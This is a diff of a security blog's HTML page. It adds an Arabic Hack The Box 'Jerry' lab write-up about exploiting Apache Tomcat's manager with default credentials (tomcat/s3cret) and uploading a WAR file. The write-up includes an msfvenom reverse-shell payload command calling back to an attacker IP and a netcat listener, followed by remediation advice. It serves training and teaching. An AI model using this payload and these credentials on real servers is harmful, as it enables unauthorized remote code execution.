@@ -30,23 +30,27 @@
 
   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.4.1" />
-<meta property="og:title" content="Hack with Farouk" />
+<meta property="og:title" content="HTB Jerry Lab - Arabic Hack The Box Report" />
+<meta name="author" content="Farouk AlKowatly" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Hack with Farouk - Learn ethical hacking, penetration testing, cybersecurity research, Hack The Box Walkthrough, malware analysis, AV evasion, and red teaming techniques. Stay updated with the latest exploits, security tools, and hacking methodologies." />
-<meta property="og:description" content="Hack with Farouk - Learn ethical hacking, penetration testing, cybersecurity research, Hack The Box Walkthrough, malware analysis, AV evasion, and red teaming techniques. Stay updated with the latest exploits, security tools, and hacking methodologies." />
-<link rel="canonical" href="https://farouk9423.github.io/" />
-<meta property="og:url" content="https://farouk9423.github.io/" />
+<meta name="description" content="1️⃣ HTB Jerry Lab - Arabic Hack The Box Report" />
+<meta property="og:description" content="1️⃣ HTB Jerry Lab - Arabic Hack The Box Report" />
+<link rel="canonical" href="https://farouk9423.github.io/posts/Jerry_HTBLab/" />
+<meta property="og:url" content="https://farouk9423.github.io/posts/Jerry_HTBLab/" />
 <meta property="og:site_name" content="Hack with Farouk" />
-<meta property="og:type" content="website" />
-<meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Hack with Farouk" />
+<meta property="og:image" content="https://Farouk9423.github.io/images/Labs/jerry/1.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-28T00:00:00+03:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://Farouk9423.github.io/images/Labs/jerry/1.png" />
+<meta property="twitter:title" content="HTB Jerry Lab - Arabic Hack The Box Report" />
 <meta name="google-site-verification" content="POn0E2GK57I8UruQN45B4BPg9O2nAVXgtqvaxWfKQhI" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","description":"Hack with Farouk - Learn ethical hacking, penetration testing, cybersecurity research, Hack The Box Walkthrough, malware analysis, AV evasion, and red teaming techniques. Stay updated with the latest exploits, security tools, and hacking methodologies.","headline":"Hack with Farouk","name":"Farouk","sameAs":["https://www.linkedin.com/in/farouk-alkowatly/","https://github.com/Farouk9423","https://www.instagram.com/Hack_with_Farouk/"],"url":"https://farouk9423.github.io/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Farouk AlKowatly","url":"https://www.linkedin.com/in/farouk-alkowatly/"},"dateModified":"2025-07-29T11:51:39+03:00","datePublished":"2025-07-28T00:00:00+03:00","description":"1️⃣ HTB Jerry Lab - Arabic Hack The Box Report","headline":"HTB Jerry Lab - Arabic Hack The Box Report","image":{"alt":null,"url":"https://Farouk9423.github.io/images/Labs/jerry/1.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://farouk9423.github.io/posts/Jerry_HTBLab/"},"url":"https://farouk9423.github.io/posts/Jerry_HTBLab/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
-  <title>Hack with Farouk
+  <title>HTB Jerry Lab - Arabic Hack The Box Report | Hack with Farouk
   </title>
 
   <!--
@@ -110,11 +114,16 @@
   <!-- 3rd-party Dependencies -->
 
   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
+  
 
   
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
   
 
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
   
 
   <!-- Scripts -->
@@ -133,6 +142,9 @@
   
 
   
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
 
 
 
@@ -190,9 +202,30 @@
 
   
 
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
 
 
-  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script>
+
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>
 
 
 
@@ -200,11 +233,15 @@
 
 
 
-<script defer src="/assets/js/dist/home.min.js"></script>
+<script defer src="/assets/js/dist/post.min.js"></script>
 
 
 
 <!-- Pageviews -->
+
+  
+
+  
 
 
 
@@ -230,7 +267,7 @@
   <nav class="flex-column flex-grow-1 w-100 ps-0">
     <ul class="nav">
       <!-- home -->
-      <li class="nav-item active">
+      <li class="nav-item">
         <a href="/" class="nav-link">
           <i class="fa-fw fas fa-home"></i>
           <span>HOME</span>
@@ -409,9 +446,23 @@
       
 
       
-        <!-- index page -->
-        <span>Home</span>
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
 
+          
+        
+          
+        
+          
+            
+              <span>HTB Jerry Lab - Arabic Hack The Box Report</span>
+            
+
+          
+        
       
     </nav>
     <!-- endof #breadcrumb -->
@@ -421,7 +472,7 @@
     </button>
 
     <div id="topbar-title">
-      Hack with Farouk
+      Post
     </div>
 
     <button type="button" id="search-trigger" class="btn btn-link">
@@ -513,48 +564,13 @@
 
       
     
-
-    <!-- take out classes -->
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- create the image wrapper -->
       
 
       
       
+      
 
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
+      
     
       
 
@@ -589,130 +605,16 @@
     
 
     
-      <!-- create the image wrapper -->
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
       
 
       
+        <!-- create the image wrapper -->
+        
+
+        
+        
       
-
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- create the image wrapper -->
-      
-
-      
-      
-
-    
-
-    <!-- combine -->
-    
-  
-    
-
-    
-    
-
-    
-
-    
-    
-
-    
-    
-    
-
-    
-      
-
-      
-      
-      
-
-      
-    
-      
-
-      
-      
-      
-
-      
-    
-
-    <!-- take out classes -->
-    
-
-    
-    
-
-    
-
-    
-      
-    
-
-    <!-- lazy-load images -->
-    
-
-    
-      <!-- create the image wrapper -->
-      
-
-      
-      
-
     
 
     <!-- combine -->
@@ -736,10 +638,228 @@
   
 
   
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
 
   
   
 
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
   
 
   
@@ -765,69 +885,17 @@
 
 
 
-<!-- Get pinned posts on current page -->
 
+<article class="px-1" data-toc="true">
+  <header>
+    <h1 data-toc-skip>HTB Jerry Lab - Arabic Hack The Box Report</h1>
+    
 
-
-
-
-
-<!-- Get normal posts on current page -->
-
-
-
-
-
-<div id="post-list" class="flex-grow-1 px-xl-1">
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Jerry_HTBLab/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-          
-          
-
-          
-
-          
-
-          
-
-          <div class="col-md-5">
-            <div class="preview-img  shimmer"><img src="/images/Labs/jerry/1.png" alt="Preview Image"  loading="lazy"></div>
-          </div>
-
-          
-        
-
-        <div class="col-md-7">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">HTB Jerry Lab - Arabic Hack The Box Report</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>1️⃣ HTB Jerry Lab - Arabic Hack The Box Report
-
-
-
-📍 Basic Information
-
-  Category: Web
-  Difficulty: Easy
-  HTB Link: HTB Academy – Jerry 
-  Date Completed: 2025-07-28
-
-
-
-
-🔍 1. Recon &amp;amp; Enumerat...</p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
   Date format snippet
   See: ${JS_ROOT}/utils/locale-dateime.js
 -->
@@ -840,64 +908,19 @@
   data-ts="1753650000"
   data-df="ll"
   
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
 >
   Jul 28, 2025
 </time>
 
+      </span>
 
-                <!-- categories -->
-                
-                  <i class="far fa-folder-open fa-fw me-1"></i>
-                  <span class="categories">
-                    
-                      Hack_The_Box
-                  </span>
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Introduction_to_Web_Applications/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-          
-          
-
-          
-
-          
-
-          
-
-          <div class="col-md-5">
-            <div class="preview-img  shimmer"><img src="/images/HTB/IntroToWebApplications/0.webp" alt="Preview Image"  loading="lazy"></div>
-          </div>
-
-          
-        
-
-        <div class="col-md-7">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Introduction to Web Applications — Arabic HackThe Box ACADEMY Walkthrough</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>بهالدرس رح نحكي عن تطبيقات الويب وكيف بتشتغل ورح نشوفها من وجهة نظر امن المعلومات، لهيك جهز قهوتك ويلا نبلش</p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
+      <!-- lastmod date -->
+      
+        <span>
+          Updated
+          <!--
   Date format snippet
   See: ${JS_ROOT}/utils/locale-dateime.js
 -->
@@ -907,177 +930,396 @@
 
 <time
   
-  data-ts="1747602000"
+  data-ts="1753779099"
   data-df="ll"
   
->
-  May 19, 2025
-</time>
-
-
-                <!-- categories -->
-                
-                  <i class="far fa-folder-open fa-fw me-1"></i>
-                  <span class="categories">
-                    
-                      Hack_The_Box_Academy
-                  </span>
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/SQLfundemantle/" class="post-preview row g-0 flex-md-row-reverse">
-        
-
-        
-          
-          
-
-          
-
-          
-
-          
-
-          <div class="col-md-5">
-            <div class="preview-img  shimmer"><img src="/images/HTB/0.webp" alt="Preview Image"  loading="lazy"></div>
-          </div>
-
-          
-        
-
-        <div class="col-md-7">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">SQL Injection Fundamentals — Arabic HackThe Box ACADEMY Walkthrough</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>قواعد البيانات جزء مهم من بنية تطبيقات الويب،  وبدرس اليوم رح نتعلم عن قواعد البيانات وكيف نستغل الحماية الضعيفة فيها.</p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-<time
-  
-  data-ts="1747170000"
-  data-df="ll"
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
   
 >
-  May 14, 2025
+  Jul 29, 2025
 </time>
 
+        </span>
+      
 
-                <!-- categories -->
-                
-                  <i class="far fa-folder-open fa-fw me-1"></i>
-                  <span class="categories">
-                    
-                      Hack_The_Box_Academy
-                  </span>
-                
-              </div>
+      
+        
+        
+        
 
+        
+
+        <div class="mt-3 mb-3">
+          <a href="/images/Labs/jerry/1.png" class="popup img-link preview-img shimmer"><img src="/images/Labs/jerry/1.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
               
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
-        </div>
-      </a>
-    </article>
-  
-    <article class="card-wrapper card">
-      <a href="/posts/Keylogger/" class="post-preview row g-0 flex-md-row-reverse">
-        
+                <a href="https://www.linkedin.com/in/farouk-alkowatly/">Farouk AlKowatly</a>
+                
+              
+            
+          </em>
+        </span>
 
-        
-          
+        <div>
+          <!-- pageviews -->
           
 
-          
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
 
-          
 
-          
 
-          <div class="col-md-5">
-            <div class="preview-img  shimmer"><img src="/images/HTB/e143-keylogger.gif" alt="image alternative tex"  loading="lazy"></div>
-          </div>
-
-          
-        
-
-        <div class="col-md-7">
-          <div class="card-body d-flex flex-column">
-            <h1 class="card-title my-2 mt-md-0">Keylogger with Python in Arabic</h1>
-
-            <div class="card-text content mt-0 mb-3">
-              <p>؟ وكيف بشتغل؟ وكيف فينا نساويه بأيدنا؟ Keylogger شو هو ال</p>
-            </div>
-
-            <div class="post-meta flex-grow-1 d-flex align-items-end">
-              <div class="me-auto">
-                <!-- posted date -->
-                <i class="far fa-calendar fa-fw me-1"></i>
-                <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
+<!-- words per minute -->
 
 
 
 
-<time
-  
-  data-ts="1742763600"
-  data-df="ll"
-  
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="387 words"
 >
-  Mar 24, 2025
-</time>
+  <em>2 min</em> read</span>
 
-
-                <!-- categories -->
-                
-                  <i class="far fa-folder-open fa-fw me-1"></i>
-                  <span class="categories">
-                    
-                      Python_for_Hackers
-                  </span>
-                
-              </div>
-
-              
-            </div>
-            <!-- .post-meta -->
-          </div>
-          <!-- .card-body -->
         </div>
-      </a>
-    </article>
+      </div>
+    </div>
+  </header>
+
   
+    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
+      <span class="label text-truncate">HTB Jerry Lab - Arabic Hack The Box Report</span>
+      <button type="button" class="toc-trigger btn me-1">
+        <i class="fa-solid fa-list-ul fa-fw"></i>
+      </button>
+    </div>
+
+    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
+      <span class="label ps-2 pe-1">Contents</span>
+      <i class="fa-solid fa-angle-right fa-fw"></i>
+    </button>
+
+    <dialog id="toc-popup" class="p-0">
+      <div class="header d-flex flex-row align-items-center justify-content-between">
+        <div class="label text-truncate py-2 ms-4">HTB Jerry Lab - Arabic Hack The Box Report</div>
+        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
+          <i class="fas fa-close"></i>
+        </button>
+      </div>
+      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
+    </dialog>
+  
+
+  <div class="content">
+    <h1 id="1️⃣-htb-jerry-lab---arabic-hack-the-box-report">1️⃣ HTB Jerry Lab - Arabic Hack The Box Report</h1>
+
+<hr />
+<h2 id="-basic-information"><span class="me-2">📍 Basic Information</span><a href="#-basic-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<ul>
+  <li><em>Category:</em> Web</li>
+  <li><em>Difficulty:</em> Easy</li>
+  <li><em>HTB Link:</em> <a href="https://app.hackthebox.com/machines/Jerry">HTB Academy – Jerry </a></li>
+  <li><em>Date Completed:</em> 2025-07-28</li>
+</ul>
+
+<hr />
+
+<h2 id="-1-recon--enumeration"><span class="me-2">🔍 1. Recon &amp; Enumeration</span><a href="#-1-recon--enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="-target-information"><span class="me-2">🌐 Target Information</span><a href="#-target-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<ul>
+  <li><em>IP:</em> 10.10.10.95</li>
+  <li><em>Ports:</em> 8080 (HTTP)</li>
+  <li><em>Service:</em> Apache Tomcat</li>
+  <li><em>Technology Identified:</em> Apache Tomcat</li>
+  <li><em>OS Guessing:</em> Windows</li>
+</ul>
+
+<h3 id="-files--endpoints-discovered"><span class="me-2">📄 Files / Endpoints Discovered</span><a href="#-files--endpoints-discovered" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<ul>
+  <li>/docs</li>
+  <li>/manager/html</li>
+  <li>/examples</li>
+</ul>
+
+<h3 id="-tools-used"><span class="me-2">🧪 Tools Used</span><a href="#-tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">nmap</code>, <code class="language-plaintext highlighter-rouge">ffuf</code>, <code class="language-plaintext highlighter-rouge">msfvenom</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-2-vulnerability-identification"><span class="me-2">🎯 2. Vulnerability Identification</span><a href="#-2-vulnerability-identification" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="-vulnerability-types"><span class="me-2">✅ Vulnerability Type(s)</span><a href="#-vulnerability-types" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<ul class="task-list">
+  <li class="task-list-item"><i class="fas fa-check-circle fa-fw checked"></i>File Upload Attack</li>
+  <li class="task-list-item"><i class="fas fa-check-circle fa-fw checked"></i>Weak Credential</li>
+</ul>
+
+<h3 id="-explanation"><span class="me-2">🧠 Explanation</span><a href="#-explanation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+اثناء فحص ال Directories وجدت صفحة تسجيل دخول manager/html وهي عبارة عن صفحة تسجيل دخول، قمت بالتسجيل بال username وال password الافتراضيين ل Tomcat، وبالفعل استطعت تسجيل الدخول.
+</p>
+<p>![[Pasted image 20250728212622.png]]</p>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+لاحظت بصفحة ال manager وجود مكان لرفع ملف Web Application Resource (WAR) وهو ملف يحتوي على الملفات المبنية ب Java الضرورية لعمل الموقع.
+
+السماح برفع ملفات WAR وتمكين المستخدم من تشغيلها بدون تحقق من التوثيق يمثل خلل أمني يسمح بتنفيذ أوامر عن بعد RCE، وهذا يُصنف كـ Remote Code Execution.
+</p>
+
+<hr />
+
+<h2 id="-3-exploitation"><span class="me-2">🚀 3. Exploitation</span><a href="#-3-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="-payload-used"><span class="me-2">🔧 Payload Used</span><a href="#-payload-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+بعد بحث خفيف على Google وجدت ان ممكن انشأ ال payload باستخدام msvenom : 
+</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.15.93 <span class="nv">LPORT</span><span class="o">=</span>9002 <span class="nt">-f</span> war <span class="o">&gt;</span> rev_shell.war
+</pre></td></tr></tbody></table></code></div></div>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+وطبعاً لازم شغل Listener عندي باستخدام Netcat:
+</p>
+
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 9002
+</pre></td></tr></tbody></table></code></div></div>
+
+<hr />
+<h3 id="-result--effect"><span class="me-2">🎯 Result / Effect</span><a href="#-result--effect" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+بعد ما جهزت ال Listener وانشأت ال Payload، برفعه على الصفحة، بس ما رح يصير شي عندي لانه صح انرفع بس ما تم تفعيله، لهيك لازم اضغط على رابط ال Payload يلي تم انشائه:
+</p>
+
+<p>![[2.webp]]</p>
+
+<hr />
+
+<h2 id="-4-proof-of-concept-poc"><span class="me-2">📎 4. Proof of Concept (PoC)</span><a href="#-4-proof-of-concept-poc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="-steps-to-reproduce"><span class="me-2">💬 Steps to Reproduce:</span><a href="#-steps-to-reproduce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+1. افتح 8080:[Your_IP] وسجل الدخول بـ:
+    
+2. بعد الدخول، انتقل مباشرة إلى /manager/html
+    - username: tomcat
+        
+    - password: s3cret
+        
+    
+3. لاحظ ممكن رفع ملف war.
+    
+4. انشأ payload Java وقم برفعه ثم تشغيله.
+    
+</p>
+
+<h3 id="-screenshot"><span class="me-2">🖼 Screenshot</span><a href="#-screenshot" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>![[3.webp]]</p>
+
+<p>![[4.webp]]</p>
+
+<hr />
+
+<h2 id="-5-impact--risk"><span class="me-2">📊 5. Impact &amp; Risk</span><a href="#-5-impact--risk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+- *OWASP Category:* A08:2021 - Software and Data Integrity Failures , A05:2021 - Security Misconfiguration
+    
+- *CVSS Score:* 9.0 (Critical)
+    
+- *Impact:*  
+    يسمح للمستخدمين غير المصرح لهم بالوصول إلى صلاحية ال Administrator
+    
+</p>
+
+<hr />
+
+<h2 id="-7-lessons-learned"><span class="me-2">🗒 7. Lessons Learned</span><a href="#-7-lessons-learned" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p dir="rtl" style=" font-size: 22px; line-height: 1.6;">
+
+- ضرورة تعطيل واجهات الإدارة (manager/html) أو تقييدها عبر جدار ناري داخلي.
+    
+- تقييد رفع ملفات WAR لمديرين موثوقين فقط.
+    
+- فحص ملفات WAR باستخدام AV و sandbox قبل النشر.
+
+</p>
+
+<hr />
+
+<h2 id="-references"><span class="me-2">🔗 References</span><a href="#-references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<ul>
+  <li>
+    <p><a href="https://academy.hackthebox.com/module/details/136">HTB Academy - File Upload Attacks</a></p>
+  </li>
+  <li>
+    <p><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">OWASP A08 – Software and Data Integrity Failuresl</a></p>
+  </li>
+  <li>
+    <p><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP A05 – Security Misconfiguration</a></p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="tags"><span class="me-2"><em>tags:</em></span><a href="#tags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>#HTB_Repo , #Web , #Bug_Bounty , #File_Upload_Attack ,#web_pentest</p>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/hack-the-box/">Hack_The_Box</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/htb-repo/"
+            class="post-tag no-text-decoration"
+          >HTB_Repo</a>
+        
+          <a
+            href="/tags/web/"
+            class="post-tag no-text-decoration"
+          >Web</a>
+        
+          <a
+            href="/tags/bug-bounty/"
+            class="post-tag no-text-decoration"
+          >Bug_Bounty</a>
+        
+          <a
+            href="/tags/file-upload-attack/"
+            class="post-tag no-text-decoration"
+          >File_Upload_Attack</a>
+        
+          <a
+            href="/tags/web-pentest/"
+            class="post-tag no-text-decoration"
+          >web_pentest</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=HTB%20Jerry%20Lab%20-%20Arabic%20Hack%20The%20Box%20Report%20-%20Hack%20with%20Farouk&url=https%3A%2F%2Ffarouk9423.github.io%2Fposts%2FJerry_HTBLab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HTB%20Jerry%20Lab%20-%20Arabic%20Hack%20The%20Box%20Report%20-%20Hack%20with%20Farouk&u=https%3A%2F%2Ffarouk9423.github.io%2Fposts%2FJerry_HTBLab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=https%3A%2F%2Ffarouk9423.github.io%2Fposts%2FJerry_HTBLab%2F&text=HTB%20Jerry%20Lab%20-%20Arabic%20Hack%20The%20Box%20Report%20-%20Hack%20with%20Farouk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ffarouk9423.github.io%2Fposts%2FJerry_HTBLab%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
+        <i class="fa-fw fab fa-linkedin"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
 </div>
-<!-- #post-list -->
 
-
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
 
 
             
@@ -1560,12 +1802,94 @@
             </div>
 
             
+              
+              
+
+
+
+
+
+
+  <div class="toc-border-cover z-3"></div>
+  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
+    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
           </aside>
         </div>
 
         <div class="row">
           <!-- tail -->
           <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    
+
+
+
+
+
+
+
+
+
+
+
+            
+              
